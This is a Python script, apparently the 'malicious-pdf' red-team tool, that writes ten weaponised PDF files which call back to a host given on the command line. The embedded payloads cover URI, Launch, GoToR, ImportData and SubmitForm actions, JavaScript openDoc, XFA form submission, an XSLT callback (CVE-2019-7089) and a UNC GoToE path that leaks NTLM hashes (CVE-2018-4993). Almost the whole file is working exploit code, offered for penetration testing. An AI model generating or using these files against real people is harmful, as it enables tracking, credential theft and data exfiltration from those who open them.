#!/usr/bin/python
##
## Create different types of malicious PDF files. Used for penetration testing and/or red-teaming etc
##
## Usage ./malicious-pdf.py burp-collaborator-url
##
## Output will be written as: test1.pdf, test2.pdf, test3.pdf and test4.pdf
##
## Based on https://github.com/modzero/mod0BurpUploadScanner/ and https://github.com/deepzec/Bad-Pdf
##
## Jonas Lejon, 2021 <jonas.github@triop.se> 
## https://github.com/jonaslejon/malicious-pdf

import io
import sys

## Testcase from 01-testsuite/02-disclosure/01-url-invocation/data-link.pdf
## https://github.com/RUB-NDS/PDF101 "Portable Document Flaws 101" at Black Hat USA 2020
def create_malpdf9(filename, host):
    with io.FileIO(filename, "w") as file:
        file.write('''
%PDF-1.7

1 0 obj
  << /Type /Catalog
     /Pages 2 0 R
     /AcroForm << /Fields [<< /Type /Annot /Subtype /Widget /FT /Tx /T (a) /V (b) /Ff 0 >>] >>
  >>
endobj

2 0 obj
  << /Type /Pages
     /Kids [3 0 R]
     /Count 1
     /MediaBox [0 0 595 842]
  >>
endobj

3 0 obj
  << /Type /Page
     /Parent 2 0 R
     /Resources
      << /Font
          << /F1
              << /Type /Font
                 /Subtype /Type1
                 /BaseFont /Courier
              >>
          >>
      >>
     /Annots [<< /Type /Annot
                 /Subtype /Link
                 /Open true
                 /A 5 0 R
                 /H /N
                 /Rect [0 0 595 842]
              >>]
     /Contents [4 0 R]
  >>
endobj

4 0 obj
  << /Length 67 >>
stream
  BT
    /F1 22 Tf
    30 800 Td
    (Testcase: 'data'    ) Tj
  ET
endstream
endobj

5 0 obj
  << /Type /Action
     /S /ImportData
     /F << /Type /FileSpec /F ('''+host+'''/test9.pdf) /V true /FS /URL >>
  >>
endobj

xref
0 6
0000000000 65535 f
0000000010 00000 n
0000000164 00000 n
0000000265 00000 n
0000000724 00000 n
0000000844 00000 n
trailer
  << /Root 1 0 R
     /Size 6
  >>
startxref
997
%%EOF
''')

## Testcase from ./02-exploits/15-masterpdf-editor/02-disclosure-01-url-invocation.pdf
## https://github.com/RUB-NDS/PDF101 "Portable Document Flaws 101" at Black Hat USA 2020
def create_malpdf8(filename, host):
    with io.FileIO(filename, "w") as file:
        file.write(
'''
%PDF-1.7

1 0 obj
  << /Type /Catalog
     /Pages 2 0 R
     /OpenAction 5 0 R
     /AcroForm << /Fields [<< /Type /Annot /Subtype /Widget /FT /Tx /T (a) /V (b) /Ff 0 >>] >>
  >>
endobj

2 0 obj
  << /Type /Pages
     /Kids [3 0 R]
     /Count 1
     /MediaBox [0 0 595 842]
  >>
endobj

3 0 obj
  << /Type /Page
     /Parent 2 0 R
     /Resources
      << /Font
          << /F1
              << /Type /Font
                 /Subtype /Type1
                 /BaseFont /Courier
              >>
          >>
      >>
     /Contents [4 0 R]
  >>
endobj

4 0 obj
  << /Length 67 >>
stream
  BT
    /F1 22 Tf
    30 800 Td
    (Testcase: 'form'    ) Tj
  ET
endstream
endobj

5 0 obj
  << /Type /Action
     /S /SubmitForm
     /F << /Type /FileSpec /F ('''+host+'''/test8.pdf) /V true /FS /URL >>
     /Flags 4 % SubmitHTML
   % /Flags 32 % SubmitXFDF
   % /Flags 256 % SubmitPDF
  >>
endobj

xref
0 6
0000000000 65535 f
0000000010 00000 n
0000000187 00000 n
0000000288 00000 n
0000000553 00000 n
0000000673 00000 n
trailer
  << /Root 1 0 R
     /Size 6
  >>
startxref
908
%%EOF
''')

## Testcase from ./02-exploits/25-firefox-browser/02-disclosure-01-url-invocation-dns-prefetch3.pdf
## https://github.com/RUB-NDS/PDF101 "Portable Document Flaws 101" at Black Hat USA 2020
def create_malpdf7(filename, host):
    with io.FileIO(filename, "w") as file:
        file.write(
'''
%PDF-1.7

1 0 obj
  << /Type /Catalog
     /Pages 2 0 R
  >>
endobj

2 0 obj
  << /Type /Pages
     /Kids [3 0 R]
     /Count 1
     /MediaBox [0 0 595 842]
  >>
endobj

3 0 obj
  << /Type /Page
     /Parent 2 0 R
     /Resources
      << /Font
          << /F1
              << /Type /Font
                 /Subtype /Type1
                 /BaseFont /Courier
              >>
          >>
      >>
     /Annots [<< /Type /Annot
                 /Subtype /Link
                 /Open true
                 /A 5 0 R
                 /H /N
                 /Rect [0 0 595 842]
              >>]
     /Contents [4 0 R]
  >>
endobj

4 0 obj
  << /Length 67 >>
stream
  BT
    /F1 22 Tf
    30 800 Td
    (Testcase: 'gotor'   ) Tj
  ET
endstream
endobj

5 0 obj
  << /Type /Action
     /S /GoToR
     /F << /Type /FileSpec /F ('''+host+'''/test7.pdf) /V true /FS /URL >>
     /NewWindow false
     /D [0 /Fit]
  >>
endobj

xref
0 6
0000000000 65535 f
0000000010 00000 n
0000000069 00000 n
0000000170 00000 n
0000000629 00000 n
0000000749 00000 n
trailer
  << /Root 1 0 R
     /Size 6
  >>
startxref
937
%%EOF
''')

## Testcase from ./02-exploits/25-firefox-browser/02-disclosure-01-url-invocation-dns-prefetch2.pdf
## https://github.com/RUB-NDS/PDF101 "Portable Document Flaws 101" at Black Hat USA 2020
def create_malpdf6(filename, host):
    with io.FileIO(filename, "w") as file:
        file.write(
'''
%PDF-1.7

1 0 obj
  << /Type /Catalog
     /Pages 2 0 R
  >>
endobj

2 0 obj
  << /Type /Pages
     /Kids [3 0 R]
     /Count 1
     /MediaBox [0 0 595 842]
  >>
endobj

3 0 obj
  << /Type /Page
     /Parent 2 0 R
     /Resources
      << /Font
          << /F1
              << /Type /Font
                 /Subtype /Type1
                 /BaseFont /Courier
              >>
          >>
      >>
     /Annots [<< /Type /Annot
                 /Subtype /Link
                 /Open true
                 /A 5 0 R
                 /H /N
                 /Rect [0 0 595 842]
              >>]
     /Contents [4 0 R]
  >>
endobj

4 0 obj
  << /Length 67 >>
stream
  BT
    /F1 22 Tf
    30 800 Td
    (Testcase: 'launch'  ) Tj
  ET
endstream
endobj

5 0 obj
  << /Type /Action
     /S /Launch
     /F << /Type /FileSpec /F (''' + host + '''/test6.pdf) /V true /FS /URL >>
     /NewWindow false
  >>
endobj

xref
0 6
0000000000 65535 f
0000000010 00000 n
0000000069 00000 n
0000000170 00000 n
0000000629 00000 n
0000000749 00000 n
trailer
  << /Root 1 0 R
     /Size 6
  >>
startxref
922
%%EOF
''')

## Testcase from ./02-exploits/25-firefox-browser/02-disclosure-01-url-invocation-dns-prefetch.pdf
## https://github.com/RUB-NDS/PDF101 "Portable Document Flaws 101" at Black Hat USA 2020
def create_malpdf5(filename, host):
    with io.FileIO(filename, "w") as file:
        file.write('''
%PDF-1.7

1 0 obj
  << /Type /Catalog
     /Pages 2 0 R
  >>
endobj

2 0 obj
  << /Type /Pages
     /Kids [3 0 R]
     /Count 1
     /MediaBox [0 0 595 842]
  >>
endobj

3 0 obj
  << /Type /Page
     /Parent 2 0 R
     /Resources
      << /Font
          << /F1
              << /Type /Font
                 /Subtype /Type1
                 /BaseFont /Courier
              >>
          >>
      >>
     /Annots [<< /Type /Annot
                 /Subtype /Link
                 /Open true
                 /A 5 0 R
                 /H /N
                 /Rect [0 0 595 842]
              >>]
     /Contents [4 0 R]
  >>
endobj

4 0 obj
  << /Length 67 >>
stream
  BT
    /F1 22 Tf
    30 800 Td
    (Testcase: 'uri'     ) Tj
  ET
endstream
endobj

5 0 obj
  << /Type /Action
     /S /URI
     /URI (''' + host + '''/test5)
  >>
endobj

xref
0 6
0000000000 65535 f
0000000010 00000 n
0000000069 00000 n
0000000170 00000 n
0000000629 00000 n
0000000749 00000 n
trailer
  << /Root 1 0 R
     /Size 6
  >>
startxref
854
%%EOF
''')

def create_malpdf3(filename, host):
    with io.FileIO(filename, "w") as file:
        file.write(
'''% a pdf file where javascript code is evaluated for execution
% BSD Licence, Ange Albertini, 2011
%PDF-1.4
1 0 obj
<<>>
%endobj
trailer
<<
/Root
  <</Pages <<>>
  /OpenAction
      <<
      /S/JavaScript
      /JS(
      eval(
          'app.openDoc({cPath: encodeURI("''' + host +'''"), cFS: "CHTTP" });'
          );
      )
      >>
  >>
>>''')

def create_malpdf2(filename, host):
    with io.FileIO(filename, "w") as file:
        file.write('''
% a PDF file using an XFA
% most whitespace can be removed (truncated to 570 bytes or so...)
% Ange Albertini BSD Licence 2012
% modified by InsertScript
%PDF-1. % can be truncated to %PDF-\0
1 0 obj <<>>
stream
<xdp:xdp xmlns:xdp="http://ns.adobe.com/xdp/">
<config><present><pdf>
    <interactive>1</interactive>
</pdf></present></config>
<template>
    <subform name="_">
        <pageSet/>
        <field id="Hello World!">
            <event activity="docReady" ref="$host" name="event__click">
               <submit
                     textEncoding="UTF-16"
                     xdpContent="pdf datasets xfdf"
                     target="''' + host + '''"/>
            </event>
</field>
    </subform>
</template>
</xdp:xdp>
endstream
endobj
trailer <<
    /Root <<
        /AcroForm <<
            /Fields [<<
                /T (0)
                /Kids [<<
                    /Subtype /Widget
                    /Rect []
                    /T ()
                    /FT /Btn
                >>]
            >>]
            /XFA 1 0 R
        >>
        /Pages <<>>
    >>
>>''')

# Adobe Reader - PDF callback via XSLT stylesheet in XFA
# CVE-2019-7089
# From: https://insert-script.blogspot.com/2019/01/adobe-reader-pdf-callback-via-xslt.html
def create_malpdf4(filename, host):
    with io.FileIO(filename, "w") as file:
        file.write('''
        % a PDF file using an XFA
% most whitespace can be removed (truncated to 570 bytes or so...)
% Ange Albertini BSD Licence 2012

%PDF-1. % can be truncated to %PDF-

1 0 obj <<>>
stream
<?xml version="1.0" ?>
<?xml-stylesheet href="\\''' + host + '''\whatever.xslt" type="text/xsl" ?>
endstream
endobj
trailer <<
    /Root <<

        /AcroForm <<
            /Fields [<<
                /T (0)
                /Kids [<<
                    /Subtype /Widget
                    /Rect []
                    /T ()
                    /FT /Btn
                >>]
            >>]
            /XFA 1 0 R
        >>
        /Pages <<>>
    >>
>>
''')


# This is CVE-2018-4993
# From https://github.com/deepzec/Bad-Pdf/blob/master/badpdf.py
def create_malpdf(filename, host):
    with io.FileIO(filename, "w") as file:
        file.write('''
%PDF-1.7

1 0 obj
<</Type/Catalog/Pages 2 0 R>>
endobj
2 0 obj
<</Type/Pages/Kids[3 0 R]/Count 1>>
endobj
3 0 obj
<</Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]/Resources<<>>>>
endobj
xref
0 4
0000000000 65535 f
0000000015 00000 n
0000000060 00000 n
0000000111 00000 n
trailer
<</Size 4/Root 1 0 R>>
startxref
190
3 0 obj
<< /Type /Page
   /Contents 4 0 R

   /AA <<
	   /O <<
	      /F (''' + host + ''')
		  /D [ 0 /Fit]
		  /S /GoToE
		  >>

	   >>

	   /Parent 2 0 R
	   /Resources <<
			/Font <<
				/F1 <<
					/Type /Font
					/Subtype /Type1
					/BaseFont /Helvetica
					>>
				  >>
				>>
>>
endobj


4 0 obj<< /Length 100>>
stream
BT
/TI_0 1 Tf
14 0 0 14 10.000 753.976 Tm
0.0 0.0 0.0 rg
(PDF Document) Tj
ET
endstream
endobj


trailer
<<
	/Root 1 0 R
>>

%%EOF
''')


if __name__ == "__main__":

  try:
    host = sys.argv[1]
  except IndexError as e:
      print("Usage: {} phone-home-url-without-http-prefix".format(sys.argv[0]))
      sys.exit(1)

  print("Creating PDF files..")

  create_malpdf("test1.pdf", '\\\\' + '\\\\'  + host + '\\\\' )
  create_malpdf("test2.pdf", 'https://' + host)
  create_malpdf2("test3.pdf", 'https://' + host)
  create_malpdf3("test4.pdf", 'https://' + host)
  create_malpdf4("test5.pdf", 'https://' + host)
  create_malpdf5("test6.pdf", 'https://' + host)
  create_malpdf6("test7.pdf", 'https://' + host)
  create_malpdf7("test8.pdf", 'https://' + host)
  create_malpdf8("test9.pdf", 'https://' + host)
  create_malpdf9("test10.pdf", 'https://' + host)

  print("Done.")
